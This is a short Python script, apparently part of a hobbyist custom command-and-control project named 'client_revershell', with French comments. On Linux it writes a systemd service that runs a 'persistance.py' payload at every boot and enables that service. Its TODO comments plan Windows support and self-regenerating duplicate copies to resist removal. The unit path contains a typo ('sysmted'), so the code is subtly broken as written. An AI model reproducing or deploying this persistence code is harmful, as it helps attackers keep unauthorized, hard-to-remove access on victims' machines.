# client_revershell
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

import time
import os

if os.name == 'nt':
    print("x")
else:
    service_path = "/etc/sysmted/system/hallo.service"

    if not os.path.exists(service_path):
        open(service_path,"w").writelines('''
        [Unit]
        Description=Lancement au démarrage

        [Service]
        ExecStart=/usr/bin/python3 /home/kali/python/customC2/persistance.py

        [Install]
        WantedBy=multi-user.target''')
        os.system("systemctl enable --now hallo.service")

# ajouter un copier/coller du fichier
# ajouter support windows
# ajouter redondance (doublons + regénération)